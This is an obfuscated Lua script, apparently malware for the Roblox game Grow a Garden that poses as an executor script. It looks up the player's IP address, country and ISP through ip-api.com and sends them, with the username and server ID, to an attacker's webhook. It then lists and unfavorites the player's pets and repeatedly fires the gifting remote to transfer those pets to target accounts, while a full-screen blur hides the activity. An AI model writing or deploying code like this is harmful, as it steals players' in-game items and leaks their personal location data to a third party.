    local blur = Instance.new(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('xNtyNxiJdGeNquZnZntOehRBXqhgexcUtMNpWhXvGZaPLpeAdWtBPvrQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('qbqCGHGeKlrhNkVYUDLNKlMdjWxYqqvmluVsVCcMUGHhnJJbLDekDuBVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('LOdNaMHkobpLqcISKtCOoafDmdXZvWYUFXoPOcqhKAteOzEYSvBVKtyLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('BEcynDGBiSHTCmPhKIyZeiEcdoRYdheqiNfmxrUZgPvgKvEyiWwPyLz8J+OkiBQZXRzIA==') .. tostring(i) .. pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('NeXdVQxxoMWitSgGgsEjRQQyZpSYTpGslolSvZSPUqiuXKovGPUPSUr4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('JrFJLeHtdLtWytPAFniiMPmUxBgRWfOWSAXCCmwWQETzzEPtfnUBxnGXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('pwlQaINOZZaSukxXUXdiGhTrcbpfhxiHqPSgsYwLtmxHxiYeDhViZhL'),
        embeds = {{
            title = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('cyCQJqmZggfcJCqAGsZHdGxTejjWPhaxyObBkoPHtyKdKdGDIjipGWh8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('vHzIxSOqVPnPAToqksBdwoDZlxbCLldlTxwgKgtLYCrjvTXLLQxQbyuRGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('OZxCokrBEyHtTspCckCrKiAntjWhuFcgNQbFFGTJsBuuhyAzzADGkPSISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('NqAokivQTDPOgdHYQRJfLBSJoaMsmOytUwGImsggkVvrlpATCgLTiZWUE9TVA=='),
            Headers = { [pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('WlRkyXRPtMyHIiRJLViUJUDISDDlInvODqtXagJJEmXOkeAbGBxEKfeQ29udGVudC1UeXBl')] = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('SGPVDqUHQVyPeZIaJjBpEknykLVpJxuxYUAGhFyKCSQxYkIvZtixNyfYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('ACSCiWkQCfoPdNNODEfhHPqxavXgdKeYwrMtlwshxLqivrabBgSPOdnVW5rbm93bg=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('akTMjnSvSFxyCFCyaoncuPThcZvmUgUGByzRduRWPPfdqkcvYPRjBgwVW5rbm93bg=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('UvxTiITlrwmHoIyBXHDJyaiVELVgXjQoQYeyfWswmYqWUHDmAkoAqXMVW5rbm93bg==') end
    local result = req({ Url = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('uDyOisahknzXZVeqNIAnZdjgvCOpebPzuTQGEhhwfWWOgvuovsrjyhgaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('QFlCowwUuJizzBjqhMfkBWSzFPpnJhwsxPwoPoVJIvdfsNtCmBfZUIJR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('dRPNKuVtRvcmBGMqSUjBLFUTqpmDPjJJOgglVikTQWFEoDkMChKIjPIPw=='), body.country or pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('tCbMbcFPSOjginmfJUGoyeWFHsIkrWEdfaNTXUXKhcQOrXPYiYmRrvZPw=='), body.isp or pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('cTutPZJUfdKnbjfpmAfXlZwenrzwnVSxcaRbyOhrSWDMSeRaBeVXrurPw==')
    end
    return pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('SQBEbcEOlBUUcfoftYiZvLfNoacMTJFWIqoRecFioAuESJoMZzMCADjPw=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('mMOinAxtQstfkHndSZEuCKEnLnxDIazrshHUpkjFXRcRLBvVHgsYynyPw=='), pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('NmwSTPzvdkyGfcmmrMEuGQbfHEeKogUVzXhszwypsOkGoWNgJMexorZPw==')
end

-- UNFAVORITE PETS AND SEND LIST
local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('yNMNYAoaKCsiMerKIjYoRwtMLvjPdRxJXdyCxyCaqNFAblPhVvGrYjPRGV4'))
    if not dex then return end
    local unfavorited = {}
    for _, item in pairs(dex:GetChildren()) do
        if item:IsA(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('vXpirkbNLuAUzXiicvOBYJeKnPjRFSIVKrqbRAbaRqCszcplxiAuSNDSW5zdGFuY2U=')) and item:GetAttribute(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('iMIkMaFklsVSbRoJtHYIkMYPYTVBJMoylTDVycmBaIltLkNetSGJNEHZA==')) == true then
            table.insert(unfavorited, item.Name)
            ReplicatedStorage:WaitForChild(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('qxVdnWurMqwahkQbeHNlBxNVOGkaFKnlBzOURkctTGaCFWxJdGavVZlR2FtZUV2ZW50cw==')):WaitForChild(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('mSjYfiHeVoaCVoqCWXhqTCdxQKUgqVbfBXCMVZJsyECVtuJzLcUOlNfVG9nZ2xlRmF2b3JpdGU=')):FireServer(item.Name)
            task.wait(0.2)
        end
    end
    -- Send webhook message with unfavorited pet names
    if #unfavorited > 0 then
        sendWebhook({
            { name = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('kdcnQWjlABiKaefHvCAHhkPGFNQqBcoURGDUjBInLJlKNSckXzxUZDZ8J+aqyBVbmZhdm9yaXRlZCBQZXRz'), value = table.concat(unfavorited, pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('xVlZUPrFdxiaYEpxEPzzmzIzRJkynlzikrQoEowNOQQJmpVRjmbMzzXLCA=')), inline = false }
        })
    end
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('MPawkhWOSrJzpViPsmGJbkQFtDoUhuAbSJGgzpImumOuETrvKHtPFPJ8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('UsbnPYKoNKifkoeWJZOlOrbtYPXGyrGaCGVrBxHmirPLaUXOqJQemrL8J+MkCBJUA=='), value = ip },
        { name = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('odjfdykeUrinkMPfLXJIVenAzUWgnEEbXhOiNBseSOnptpvyXlsfXEh8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('kHKnJCQzWRcQObkviocOrVcxqptOvGtVEEjpxXeTvECdLMEyslxbiXB8J+SuyBJU1A='), value = isp },
        { name = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('hoAjRZeeToHUXYlIUTkMAlFsVZVgbvfgHHJxOuMvCRFQNjPMhMKOdhu8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('iNYUrBJFhhgeteajYwKtDoHYHeJipOZqHspRevtbEQWAKyXcgbyNkJO4o+x77iPIFRpbWU='), value = os.date(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('DSdGWKMbOGDeXhrlBhoXNlabpCLNOohdglzssDQPmydTFTxrnbTGhEQJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('WgwtflTfPoSUDjnyBMzcqoFlFBJvAJEVpQCEKyVXyuzgCusqTNXDnHw8J+OkiBQZXRz'), value = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('oDWYsIPMPLzSFtaKBUGsEkjqpybjfpOlgfeaDjiomIFHaLpDpReEYdrTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('hGquPsMFqONItoBcBjbnlhYMzncGpQOBdHCmHlnBnxgaQObjHLBPNLq8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = wasPrivateServer and pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('tcnUjnUCehnEmoPEMDrGFcamCVgwcBPDJLvmFgELVSEWWqPrrRQNfBIUHJpdmF0ZSBzZXJ2ZXIgZGV0ZWN0ZWQuIFNlcnZlciBob3AgZXhlY3V0ZWQu') or pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('DPFtZmedBPbKVDNaiEmuywmkbESEevDtzYMHBZyOyUOehpLWePjulFTQWxyZWFkeSBpbiBwdWJsaWMgc2VydmVyLg=='), inline = false }
    })
end)

-- Watch for targets & drain pets + unfavorite
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                unfavoriteAllPets()
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('ONPIQCSGAwFALkAvLSlhFGUZYMzhCgtDyNUvtiIiUQdGgdPmFTWZoTpVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('vddgRfRfJykFenDbxqiscInSIFQTegVHokzMbHcFGcvLuwYvZqcIbUYR2l2ZVBldA=='), player}
                            ReplicatedStorage:WaitForChild(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('yIACOuFaqxzjmyRdWAjacbkIodHJDwMsYOefXvNzTcoxUkUJPHYwPPfR2FtZUV2ZW50cw==')):WaitForChild(pbBJkDzuyIhWxRrWONXeTjVZkmoeypwubcSEPvEYdWRhPYPVQdoNYzSkVFbVyyQotnIEjPKkFXrm('gkquEdEBpcAZoNDYYuuGNoLNCbxUUqwMcfmGMnzJmzEXqiQIRCeHqGkUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
    
